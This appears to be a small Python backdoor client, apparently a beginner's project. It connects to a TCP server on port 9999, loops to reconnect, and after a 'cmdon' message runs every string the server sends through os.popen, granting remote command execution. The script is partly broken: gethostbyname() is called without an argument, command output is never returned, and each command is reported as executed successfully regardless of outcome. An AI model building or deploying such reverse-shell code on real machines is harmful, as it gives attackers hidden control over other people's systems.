import sys, socket, threading, os, time

class client():
    def __init__(self):
        self.stop = False
        while not self.stop:
            try:
                self._connect()
            except KeyboardInterrupt:
                continue

    def _connect(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        HOST = 'Cosme’s MacBook Pro'
        PORT = 9999
        self.client.connect((socket.gethostbyname('localhost'), PORT))
        print("Connected")
        self.command()
    def command(self):
        cmd_mode = False
        while True:
            server_command = self.client.recv(1024).decode('utf-8')
            if server_command == "cmdon":
                cmd_mode = True
                self.client.send("You now have terminal access".encode('utf-8'))
                continue
            if server_command =="cmdoff":
                cmd_mode = False
            if cmd_mode:
                os.popen(server_command)
            else:
                if server_command == "test":
                    print("Test")
                if server_command == "hostname":
                    print(socket.gethostbyname())
            self.client.send(f"{server_command} was exectued successfully". encode('utf-8'))

if __name__ == "__main__":
    def main():
        
        print("Connecting...")    
        client()
        '''
        except:
            print("Failed.... waiting for 5 seconds")
            time.sleep(5)
            main()
        '''
    main()

